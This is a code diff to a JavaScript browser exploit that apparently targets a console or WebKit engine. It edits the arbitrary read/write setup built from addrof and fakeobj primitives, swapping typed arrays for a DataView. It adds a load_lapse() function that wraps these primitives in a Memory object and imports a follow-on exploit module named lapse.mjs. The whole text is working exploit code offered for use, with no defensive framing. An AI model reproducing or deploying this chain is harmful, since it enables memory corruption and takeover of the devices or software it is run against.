@@ -38,6 +38,8 @@ function poc() {
         c: true
     };
 
+
+
     var string_atomifier = {};
     var string_id = 10000000;
 
@@ -381,8 +383,9 @@ function poc() {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-    var expl_master = new Uint32Array(8);
-    var expl_slave = new Uint32Array(2);
+    var expl_master = new Uint32Array(new ArrayBuffer(1));
+    var expl_slave = new DataView(new ArrayBuffer(1));
+
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
     obj.buffer = expl_slave;
@@ -391,6 +394,23 @@ function poc() {
     m[4] = addrof_expl_slave;
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
+
+
+async function load_lapse(){
+	   
+        let mod = await import('./module/mem.mjs');
+        let imod = await import('./module/int64.mjs');
+        let Memory = mod.Memory;
+        let obj = {addr: null, 0: 0};
+        let obj_p = addrof(obj);
+        let obj_bt = read64(obj_p.add(8));
+        obj_p = new imod.Int(obj_p.low, obj_p.hi);
+        obj_bt = new imod.Int(obj_bt.low, obj_bt.hi);
+        new Memory(expl_master, expl_slave, obj, obj_p.add(0x10), obj_bt);
+        import('./lapse.mjs');
+    }
+    load_lapse();
+	return;
 
     var prim = {
         write8: function (addr, value) {
@@ -459,5 +479,5 @@ function poc() {
         }
     };
     window.p = prim;
-    run_hax();
+    //run_hax();
 }
